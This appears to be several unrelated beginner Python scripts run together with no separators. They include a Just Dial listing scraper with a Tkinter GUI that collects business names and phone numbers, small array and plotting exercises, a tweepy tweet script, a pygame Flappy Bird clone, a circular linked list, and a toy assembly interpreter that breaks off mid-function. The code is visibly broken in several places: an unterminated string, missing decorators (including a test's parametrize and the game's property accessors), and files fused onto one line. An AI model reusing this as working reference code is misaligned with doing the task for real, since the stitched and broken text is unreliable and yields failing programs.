        out_file = open("{0}.csv".format(self.file_name), "w")
        csvwriter = csv.DictWriter(out_file, delimiter=",", fieldnames=fields)
        csvwriter.writerow(
            {
                "Name": "Name",  
                "Phone": "Phone",  
                "Rating": "Rating",  
                "Rating Count": "Rating Count",  
                "Address": "Address",  
                "Location": "Location",  
            }
        )
        progress_value = 0
        while True:
            if page_number > 50:
                progress_value = 100
                self.progressbar["value"] = progress_value
                break
            if progress_value != 0:
                progress_value += 1
                self.label_progress["text"] = "{0}{1}".format(progress_value, "%")
                self.progressbar["value"] = progress_value
            url = total_url + "/page-%s" % page_number
            print("{0} {1}, {2}".format("Scrapping page number: ", page_number, url))
            req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64)"}
            )
            page = urllib.request.urlopen(req)
            soup = BeautifulSoup(page.read(), "html.parser")
            services = soup.find_all("li", {"class": "cntanr"})
            progress_value += 1
            self.label_progress["text"] = "{0}{1}".format(progress_value, "%")
            self.progressbar["value"] = progress_value
            for service_html in services:
                try:
                    dict_service = {}
                    name = self.get_name(service_html)
                    print(name)
                    phone = self.get_phone_number(service_html)
                    rating = self.get_rating(service_html)
                    count = self.get_rating_count(service_html)
                    address = self.get_address(service_html)
                    location = self.get_location(service_html)
                    if name is not None:
                        dict_service["Name"] = name
                    if phone is not None:
                        print("getting phone number")
                        dict_service["Phone"] = phone
                    if rating is not None:
                        dict_service["Rating"] = rating
                    if count is not None:
                        dict_service["Rating Count"] = count
                    if address is not None:
                        dict_service["Address"] = address
                    if location is not None:
                        dict_service["Address"] = location
                    csvwriter.writerow(dict_service)
                    print("
                    service_count += 1
                except AttributeError:
                    print("AttributeError Occurred 101")
            page_number += 1
        out_file.close()
class JDScrapperGUI:
    def __init__(self, master):
        self.master = master
        self.label_query = Label
        self.entry_query = Entry
        self.label_location = Label
        self.entry_location = Entry
        self.label_file_name = Label
        self.entry_file_name = Entry
        self.label_progress = Label
        self.button_start = Button
        self.progress = Progressbar
    def start_scrapping(self):
        query = self.entry_query.get()
        location = self.entry_location.get()
        file_name = self.entry_file_name.get()
        scrapper = ScrapperLogic(
            query, location, file_name, self.progress, self.label_progress
        )
        t1 = threading.Thread(target=scrapper.start_scrapping_logic, args=[])
        t1.start()
    def start(self):
        self.label_query = Label(self.master, text="Query")
        self.label_query.grid(row=0, column=0)
        self.entry_query = Entry(self.master, width=23)
        self.entry_query.grid(row=0, column=1)
        self.label_location = Label(self.master, text="Location")
        self.label_location.grid(row=1, column=0)
        self.entry_location = Entry(self.master, width=23)
        self.entry_location.grid(row=1, column=1)
        self.label_file_name = Label(self.master, text="File Name")
        self.label_file_name.grid(row=2, column=0)
        self.entry_file_name = Entry(self.master, width=23)
        self.entry_file_name.grid(row=2, column=1)
        self.label_progress = Label(self.master, text="0%")
        self.label_progress.grid(row=3, column=0)
        self.button_start = Button(
            self.master, text="Start", command=self.start_scrapping
        )
        self.button_start.grid(row=3, column=1)
        self.progress = Progressbar(
            self.master, orient=HORIZONTAL, length=350, mode="determinate"
        )
        self.progress.grid(row=4, columnspan=2)
if __name__ == "__main__":
    root = Tk()
    root.geometry("350x130+600+100")
    root.title("Just Dial Scrapper - Cool")
    JDScrapperGUI(root).start()
    root.mainloop()
N = int(input("Enter The Size Of Array"))
list = []
for i in range(0,N):
    temp = int(input("Enter The Intger Numbers"))
    list.append(temp)
finalList = []
d = int(input("Enter The Number Of Times You Want To Rotate The Array"))
for i in range(0, N):
    finalList.append(list[(i+d)%N])
print(finalList)
def sortInWave(arr, n):
    arr.sort()
    for i in range(0, n - 1, 2):
        arr[i], arr[i + 1] = arr[i + 1], arr[i]
arr = []
arr =input("Enter the arr")
sortInWave(arr, len(arr))
for i in range(0, len(arr)):
    print(arr[i],' ')__author__ = 'vamsi'
import pandas as pd 
from matplotlib import pyplot as plt 
from matplotlib import style
style.use("ggplot")
df = pd.read_csv("..\SalesData.csv")  
x = df["SalesID"].as_matrix()  
y = df["ProductPrice"].as_matrix()  
plt.xlabel("SalesID")  
plt.ylabel("ProductPrice")  
plt.title("Sales Analysis")  
plt.plot(x, y)  
plt.show()  
import mathlib
import pytest
                         [
                             (5, 25),
                             (9, 81),
                             (10, 100)
                         ]
                         )
def test_calc_square(test_input, expected_output):
    result = mathlib.calc_square(test_input)
    assert result == expected_output
import tkinter as tk
root = tk.Tk()
root.geometry("400x260+50+50")
root.title("Welcome to Letter Counter App")
message1 = tk.StringVar()
Letter1 = tk.StringVar()
def printt():
    message=message1.get()
    letter=Letter1.get()
    message = message.lower()
    letter = letter.lower()
    letter_count = message.count(letter)
    a = "your message has " + str(letter_count) + " " + letter + "'s in it."
    labl = tk.Label(root,text=a,font=('arial',15),fg='black').place(x=10,y=220)
lbl = tk.Label(root,text="Enter the Message--",font=('Ubuntu',15),fg='black').place(x=10,y=10)
lbl1 = tk.Label(root,text="Enter the Letter you want to count--",font=('Ubuntu',15),fg='black').place(x=10,y=80)
E1= tk.Entry(root,font=("arial",15),textvariable=message1,bg="white",fg="black").place(x=10,y=40,height=40,width=340)    
E2= tk.Entry(root,font=("arial",15),textvariable=Letter1,bg="white",fg="black").place(x=10,y=120,height=40,width=340)    
but = tk.Button(root,text="Check",command=printt,cursor="hand2",font=("Times new roman",30),fg="white",bg="black").place(x=10,y=170,height=40,width=380)
root.mainloop()
from __future__ import print_function
import os
import tweepy
try:
    input = raw_input
except NameError:
    pass
def getStatus():
    lines = []
    while True:
        line = input()
        if line:
            lines.append(line)
        else:
            break
    status = '\n'.join(lines)
    return status
def tweetthis(type):
    if type == "text":
        print("Enter your tweet " + user.name)
        tweet = getStatus()
        try:
            api.update_status(tweet)
        except Exception as e:
            return
    elif type == "pic":
        print("Enter pic path " + user.name)
        pic = os.path.abspath(input())
        print("Enter status " + user.name)
        title = getStatus()
        try:
            api.update_with_media(pic, status=title)
        except Exception as e:
            return
    print("\n\nDONE!!")
def initialize():
    global api, auth, user
    ck = "here"  
    cks = "here"  
    at = "here"  
    ats = "here"  
    auth = tweepy.OAuthHandler(ck, cks)
    auth.set_access_token(at, ats)
    api = tweepy.API(auth)
    user = api.me()
def main():
    doit = int(input("\n1. text\n2. picture\n"))
    initialize()
    if doit == 1:
        tweetthis("text")
    elif doit == 2:
        tweetthis("pic")
    else:
        print("OK, Let's try again!")
        main()
main()
import math
import os
from collections import deque
from random import randint
import pygame
from pygame.locals import *
FPS = 60
ANI_SPEED = 0.18  
W_WIDTH = 284 * 2     
W_HEIGHT = 512
class Bird(pygame.sprite.Sprite):
    WIDTH = 32              
    HEIGHT = 32             
    DOWN_SPEED = 0.18       
    UP_SPEED = 0.3          
    UP_DURATION = 150       
    def __init__(self, x, y, ms_to_up, images):
        super(Bird, self).__init__()
        self.x, self.y = x, y
        self.ms_to_up = ms_to_up
        self._img_wingup, self._img_wingdown = images
        self._mask_wingup = pygame.mask.from_surface(self._img_wingup)
        self._mask_wingdown = pygame.mask.from_surface(self._img_wingdown)
    def update(self, delta_frames=1):
        if self.ms_to_up > 0:
            frac_climb_done = 1 - self.ms_to_up/Bird.UP_DURATION
            self.y -= (Bird.UP_SPEED * frames_to_msec(delta_frames) *
                       (1 - math.cos(frac_climb_done * math.pi)))
            self.ms_to_up -= frames_to_msec(delta_frames)
        else:
            self.y += Bird.DOWN_SPEED * frames_to_msec(delta_frames)
    def image(self):
        if pygame.time.get_ticks() % 500 >= 250:
            return self._img_wingup
        else:
            return self._img_wingdown
    def mask(self):
        if pygame.time.get_ticks() % 500 >= 250:
            return self._mask_wingup
        else:
            return self._mask_wingdown
    def rect(self):
        return Rect(self.x, self.y, Bird.WIDTH, Bird.HEIGHT)
class PipePair(pygame.sprite.Sprite):
    WIDTH = 80          
    PIECE_HEIGHT = 32
    ADD_INTERVAL = 3000
    def __init__(self, pipe_end_img, pipe_body_img):
        self.x = float(W_WIDTH - 1)
        self.score_counted = False
        self.image = pygame.Surface((PipePair.WIDTH, W_HEIGHT), SRCALPHA)
        self.image.convert()   
        self.image.fill((0, 0, 0, 0))
        total_pipe_body_pieces = int(
            (W_HEIGHT -                  
             3 * Bird.HEIGHT -             
             3 * PipePair.PIECE_HEIGHT) /  
            PipePair.PIECE_HEIGHT          
        )
        self.bottom_pieces = randint(1, total_pipe_body_pieces)
        self.top_pieces = total_pipe_body_pieces - self.bottom_pieces
        for i in range(1, self.bottom_pieces + 1):
            piece_pos = (0, W_HEIGHT - i*PipePair.PIECE_HEIGHT)
            self.image.blit(pipe_body_img, piece_pos)
        bottom_pipe_end_y = W_HEIGHT - self.bottom_height_px
        bottom_end_piece_pos = (0, bottom_pipe_end_y - PipePair.PIECE_HEIGHT)
        self.image.blit(pipe_end_img, bottom_end_piece_pos)
        for i in range(self.top_pieces):
            self.image.blit(pipe_body_img, (0, i * PipePair.PIECE_HEIGHT))
        top_pipe_end_y = self.top_height_px
        self.image.blit(pipe_end_img, (0, top_pipe_end_y))
        self.top_pieces += 1
        self.bottom_pieces += 1
        self.mask = pygame.mask.from_surface(self.image)
    def top_height_px(self):
        return self.top_pieces * PipePair.PIECE_HEIGHT
    def bottom_height_px(self):
        return self.bottom_pieces * PipePair.PIECE_HEIGHT
    def visible(self):
        return -PipePair.WIDTH < self.x < W_WIDTH
    def rect(self):
        return Rect(self.x, 0, PipePair.WIDTH, PipePair.PIECE_HEIGHT)
    def update(self, delta_frames=1):
        self.x -= ANI_SPEED * frames_to_msec(delta_frames)
    def collides_with(self, bird):
        return pygame.sprite.collide_mask(self, bird)
def load_images():
    def load_image(img_file_name):
        file_name = os.path.join('.', 'images', img_file_name)
        img = pygame.image.load(file_name)
        img.convert()
        return img
    return {'background': load_image('background.png'),
            'pipe-end': load_image('pipe_end.png'),
            'pipe-body': load_image('pipe_body.png'),
            'bird-wingup': load_image('bird_wing_up.png'),
            'bird-wingdown': load_image('bird_wing_down.png')}
def frames_to_msec(frames, fps=FPS):
    return 1000.0 * frames / fps
def msec_to_frames(milliseconds, fps=FPS):
    return fps * milliseconds / 1000.0
def main():
    pygame.init()
    display_surface = pygame.display.set_mode((W_WIDTH, W_HEIGHT))
    pygame.display.set_caption('Flappy Bird by PMN')
    clock = pygame.time.Clock()
    score_font = pygame.font.SysFont(None, 32, bold=True)  
    images = load_images()
    bird = Bird(50, int(W_HEIGHT/2 - Bird.HEIGHT/2), 2,
                (images['bird-wingup'], images['bird-wingdown']))
    pipes = deque()
    frame_clock = 0  
    score = 0
    done = paused = False
    while not done:
        clock.tick(FPS)
        if not (paused or frame_clock % msec_to_frames(PipePair.ADD_INTERVAL)):
            pp = PipePair(images['pipe-end'], images['pipe-body'])
            pipes.append(pp)
        for e in pygame.event.get():
            if e.type == QUIT or (e.type == KEYUP and e.key == K_ESCAPE):
                done = True
                break
            elif e.type == KEYUP and e.key in (K_PAUSE, K_p):
                paused = not paused
            elif e.type == MOUSEBUTTONUP or (e.type == KEYUP and
                    e.key in (K_UP, K_RETURN, K_SPACE)):
                bird.ms_to_up = Bird.UP_DURATION
        if paused:
            continue  
        pipe_collision = any(p.collides_with(bird) for p in pipes)
        if pipe_collision or 0 >= bird.y or bird.y >= W_HEIGHT - Bird.HEIGHT:
            done = True
        for x in (0, W_WIDTH / 2):
            display_surface.blit(images['background'], (x, 0))
        while pipes and not pipes[0].visible:
            pipes.popleft()
        for p in pipes:
            p.update()
            display_surface.blit(p.image, p.rect)
        bird.update()
        display_surface.blit(bird.image, bird.rect)
        for p in pipes:
            if p.x + PipePair.WIDTH < bird.x and not p.score_counted:
                score += 1
                p.score_counted = True
        score_surface = score_font.render(str(score), True, (255, 255, 255))
        score_x = W_WIDTH/2 - score_surface.get_width()/2
        display_surface.blit(score_surface, (score_x, PipePair.PIECE_HEIGHT))
        pygame.display.flip()
        frame_clock += 1
    print('Game over! Score: %i' % score)
    pygame.quit()
if __name__ == '__main__':
    main()
bharat_expenses = [20,30,45]
bilal_expenses = [45,67,34]
total=0
for item in bharat_expenses:
    total+=item
print("Bharat's total:",total)
total=0
for item in bilal_expenses:
    total+=item
print("Bilal's total:",total)
def find_total(exp):
    total=0
    for item in exp:
        total+=item
    return total
bharat_total=find_total(bharat_expenses)
print("Bharat's total:",bharat_total)
bilal_total=find_total(bilal_expenses)
print("Bilal's total:",bilal_total)
print(help(find_total))
def cylinder_volume(radius,height=1):
    print("radius is:",radius)
    print("height is:",height)
    area = 3.14*(radius**2)*height
    return area
r=5
h=10
print(cylinder_volume(height=h,radius=r))
r=5
h=10
print(cylinder_volume(radius=r))
def press():
    print('Tıklandı')
from appJar import gui 
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Circular_Linked_List:
    def __init__(self):
        self.head = None
    def Sorted_Insert(self, new_node):
        current = self.head
        if current is None:
            new_node.next = new_node
            self.head = new_node
        elif current.data >= new_node.data:
            while current.next != self.head:
                current = current.next
            current.next = new_node
            new_node.next = self.head
            self.head = new_node
        else:
            while current.next != self.head and current.next.data < new_node.data:
                current = current.next
            new_node.next = current.next
            current.next = new_node
    def Display(self):
        temp = self.head
        if self.head is not None:
            while(temp):
                print(temp.data, "->", end=" ")
                temp = temp.next
                if temp == self.head:
                    print(temp.data)
                    break
if __name__ == "__main__":
    L_list = Circular_Linked_List()
    Test_list = [12, 56, 2, 11, 1, 90]
    for keys in Test_list:
        temp = Node(keys)
        L_list.Sorted_Insert(temp)
    print("Sorted Inserted Circular Linked List: ")
    L_list.Display()
from appJar import gui
def press():
    metin = p.stringBox('Metin penceresi', 'Mesaj', parent=None)
    print(metin)
p = gui()
p.setSize(300,200)
p.addButton('Buton', press)
p.go()def print_pattern(n=5):
    for i in range(n):
        s = ''
        for j in range(i+1):
            s = s + '*'
        print(s)
def calculate_area(dimension1,dimension2,shape="triangle"):
    if shape=="triangle":
        area=1/2*(dimension1*dimension2) 
    elif shape=="rectangle":
        area=dimension1*dimension2 
    else:
        print("***Error: Input shape is neither triangle nor rectangle.")
        area=None 
    return area
base=10
height=5
triangle_area=calculate_area(base,height,"triangle")
print("Area of triangle is:",triangle_area)
length=20
width=30
rectangle_area=calculate_area(length,width,"rectangle")
print("Area of rectangle is:",rectangle_area)
triangle_area=calculate_area(base,height) 
print("Area of triangle with no shape supplied: ",triangle_area)
print("Print pattern with input=3")
print_pattern(3)
print("Print pattern with input=4")
print_pattern(4)
print("Print pattern with no input number")
print_pattern() 
from __future__ import print_function
import sys
lines = []  
tokens = []  
eax = 0
ebx = 0
ecx = 0
edx = 0
zeroFlag = False
stack = []
jumps = {}
variables = {}
returnStack = []
class InvalidSyntax(Exception):
    def __init__(self):
        pass
class Token():
    def __init__(self, token, t):
        self.token = token
        self.t = t
def loadFile(fileName):
    global lines
    fo = open(fileName)
    for line in fo:
        lines.append(line)
    fo.close()
def scanner(string):
    global tokens
    token = ""
    state = 0  
    for ch in string:
        if state == 0:
            if ch == 'm':  
                state = 1
                token += 'm'
            elif ch == 'e':  
                state = 4
                token += 'e'
            elif (ch >= '1' and ch <= '9') or ch == '-':  
                state = 6
                token += ch
            elif ch == '0':  
                state = 17
                token += ch
            elif ch == 'a':  
                state = 7
                token += ch
            elif ch == 's':  
                state = 10
                token += ch
            elif ch == 'i':  
                state = 14
                token += ch
            elif ch == 'p':  
                state = 19
                token += ch
            elif ch == 'l':  
                state = 25
                token += ch
            elif ch == 'j':  
                state = 26
                token += ch
            elif ch == 'c':  
                state = 29
                token += ch
            elif ch == ';':  
                state = 33
            elif ch == '"':  
                state = 34
            elif ch.isupper():  
                state = 35
                token += ch
            elif ch == 'd':  
                state = 36
                token += ch
            elif ch == "$":  
                state = 38
            elif ch == '_':  
                state = 40
            elif ch == 'r':  
                state = 44
                token += ch
            else:  
                state = 0
                token = ""
        elif state == 1:  
            if ch == 'o':
                state = 2
                token += ch
            elif ch == 'u':
                state = 47
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 2:  
            if ch == 'v':
                state = 3
                token += 'v'
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 3:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 4:  
            if (ch >= 'a' and ch <= 'd'):
                state = 5
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 5:  
            if ch == 'x':
                state = 13
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 6:  
            if ch.isdigit():
                state = 6
                token += ch
            elif ch.isspace():
                state = 0
                tokens.append(Token(token, "value"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 7:  
            if ch == 'd':
                state = 8
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 8:  
            if ch == 'd':
                state = 9
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 9:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 10:  
            if ch == 'u':
                state = 11
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 11:  
            if ch == 'b':
                state = 12
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 12:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 13:  
            if ch == ',' or ch.isspace():
                state = 0
                tokens.append(Token(token, "register"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 14:  
            if ch == 'n':
                state = 15
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 15:  
            if ch == 't':
                state = 16
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 16:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 17:  
            if ch == 'x':
                state = 18
                token += ch
            elif ch.isspace():
                state = 0
                tokens.append(Token(token, "value"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 18:  
            if ch.isdigit() or (ch >= 'a' and ch <= 'f'):
                state = 18
                token += ch
            elif ch.isspace():
                state = 0
                tokens.append(Token(token, "value"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 19:  
            if ch == 'u':
                state = 20
                token += ch
            elif ch == 'o':
                state = 23
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 20:  
            if ch == 's':
                state = 21
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 21:  
            if ch == 'h':
                state = 22
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 22:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 23:  
            if ch == 'p':
                state = 24
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 24:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 25:  
            if ch.isdigit():
                state = 25
                token += ch
            elif ch == ':' or ch.isspace():
                state = 0
                tokens.append(Token(token, "label"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 26:  
            if ch == 'm':
                state = 27
                token += ch
            elif ch == 'e':  
                state = 32
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 27:  
            if ch == 'p':
                state = 28
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 28:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 29:  
            if ch == 'm':
                state = 30
                token += ch
            elif ch == 'a':  
                state = 41
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 30:  
            if ch == 'p':
                state = 31
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 31:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 32:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 33:  
            if ch.isdigit() or ch.isalpha() or (ch.isspace() and ch != '\n') \
                    or ch == '"':
                state = 33
            elif ch == '\n':
                state = 0
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 34:  
            if ch.isdigit() or ch.isalpha() or ch.isspace():
                state = 34
                token += ch
            elif ch == '"':
                state = 0
                tokens.append(Token(token, "string"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 35:  
            if ch.isdigit() or ch.isupper():
                state = 35
                token += ch
            elif ch == ' ' or ch == '\n':
                state = 0
                tokens.append(Token(token, "identifier"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 36:  
            if ch == 'b':
                state = 37
                token += ch
            elif ch == 'i':
                state = 49
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 37:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 38:  
            if ch.isalpha():
                state = 39
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 39:  
            if ch.isalpha() or ch.isdigit():
                state = 39
                token += ch
            elif ch.isspace():
                state = 0
                tokens.append(Token(token, "identifier"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 40:  
            if (ch >= 'a' and ch <= 'z') or (ch >= 'A' and ch <= 'Z') or (ch >= '0' and ch <= '9'):
                state = 40
                token += ch
            elif ch == ':' or ch.isspace():
                state = 0
                tokens.append(Token(token, "subprogram"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 41:  
            if ch == 'l':
                state = 42
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 42:  
            if ch == 'l':
                state = 43
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 43:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 44:  
            if ch == 'e':
                state = 45
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 45:  
            if ch == 't':
                state = 46
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 46:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 47:  
            if ch == 'l':
                state = 48
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 48:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 49:  
            if ch == 'v':
                state = 50
                token += ch
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
        elif state == 50:  
            if ch.isspace():
                state = 0
                tokens.append(Token(token, "command"))
                token = ""
            else:  
                state = 0
                token = ""
                raise InvalidSyntax()
def scan():
    global lines
    assert len(lines) > 0, "no lines"
    for line in lines:
        try:
            scanner(line)
        except InvalidSyntax:
            print("line=", line)
def parser():
    global tokens
    global eax, ebx, ecx, edx
    assert len(tokens) > 0, "no tokens"
    pointer = 0  
    token = Token("", "")
    tmpToken = Token("", "")
    while pointer < len(tokens):
        token = tokens[pointer]
        if token.token == "mov":  
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found argument!")
                return
            if token.t == "register":
                tmpToken = token
                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print("Error: Not found argument!")
                    return
                if token.t == "identifier":  
                    if token.token in variables:
                        token.token = variables[token.token]
                    else:
                        print("Error: undefine variable! --> " + token.token)
                        return
                elif token.t == "string":
                    pass
                elif isinstance(token.token, float):
                    pass
                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == '-' and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                elif token.t == "register":  
                    if token.token == "eax":
                        token.token = eax
                    elif token.token == "ebx":
                        token.token = ebx
                    elif token.token == "ecx":
                        token.token = ecx
                    elif token.token == "edx":
                        token.token = edx
                if tmpToken.token == "eax":
                    eax = token.token
                elif tmpToken.token == "ebx":
                    ebx = token.token
                elif tmpToken.token == "ecx":
                    ecx = token.token
                elif tmpToken.token == "edx":
                    edx = token.token
            else:
                print("Error: No found register!")
                return
        elif token.token == "add":  
            pointer += 1
            token = tokens[pointer]
            if token.t == "register":
                tmpToken = token
                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print("Error: Not found number!")
                    return
                if token.t == "register":
                    if token.token == "eax":
                        token.token = eax
                    elif token.token == "ebx":
                        token.token = ebx
                    elif token.token == "ecx":
                        token.token = ecx
                    elif token.token == "edx":
                        token.token = edx
                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == '-' and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                else:
                    print("Error: ", token, " is not a number!")
                    return
                if tmpToken.token == "eax":
                    eax += token.token
                    if eax == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "ebx":
                    ebx += token.token
                    if ebx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "ecx":
                    ecx += token.token
                    if ecx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "edx":
                    edx += token.token
                    if edx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
            else:
                print("Error: Not found register!")
                return
        elif token.token == "sub":  
            pointer += 1
            token = tokens[pointer]
            if token.t == "register":
                tmpToken = token
                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print("Error: Not found number!")
                    return
                if token.t == "register":
                    if token.token == "eax":
                        token.token = eax
                    elif token.token == "ebx":
                        token.token = ebx
                    elif token.token == "ecx":
                        token.token = ecx
                    elif token.token == "edx":
                        token.token = edx
                elif isinstance(token.token, float):
                    pass
                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == '-' and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                else:
                    print("Error: ", token.token, " is not a number!")
                    return
                if tmpToken.token == "eax":
                    eax -= token.token
                    if eax == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "ebx":
                    ebx -= token.token
                    if ebx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "ecx":
                    ecx -= token.token
                    if ecx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == "edx":
                    edx -= token.token
                    if edx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
            else:
                print("Error: No found register!")
                return
        elif token.token == "int":  
            tmpToken = token
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found argument!")
                return
            if token.token == "0x80":  
                if eax == 1:  
                    if ebx == 0:
                        print("END PROGRAM")
                        return
                    else:
                        print("END PROGRAM WITH ERRORS")
                        return
                elif eax == 3:
                    ecx = float(input(">> "))
                elif eax == 4:  
                    print(ecx)
        elif token.token == "push":  
            tmpToken = token
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found register!")
                return
            if token.token == "eax":
                stack.append(eax)
            elif token.token == "ebx":
                stack.append(ebx)
            elif token.token == "ecx":
                stack.append(ecx)
            elif token.token == "edx":
                stack.append(edx)
        elif token.token == "pop":  
            tmpToken = token
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found register!")
                return
            if token.token == "eax":
                eax = stack.pop()
            elif token.token == "ebx":
                ebx = stack.pop()
            elif token.token == "ecx":
                ecx = stack.pop()
            elif token.token == "edx":
                edx = stack.pop()
        elif token.t == "label":  
            jumps[token.token] = pointer
        elif token.token == "jmp":  
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found label!")
                return
            if token.t == "label":
                pointer = jumps[token.token]
            else:
                print("Error: expected a label!")
        elif token.token == "cmp":
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print("Error: Not found argument!")
                return
            if token.t == "register":
                if pointer + 1 < len(tokens):
                    pointer += 1
                    tmpToken = tokens[pointer]  
                else:
                    print("Error: Not found register!")
                    return
                if token.token == "eax":
                    if tmpToken.token == "eax":
                        if eax == eax:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ebx":
                        if eax == ebx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "ecx":
                        if eax == ecx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                    elif tmpToken.token == "edx":
                        if eax == edx:
                            zeroFlag = True
                        else:
                            zeroFlag = False
                elif token.token == "ebx":
                    if tmpToken.token == "eax":
                        if ebx == eax:
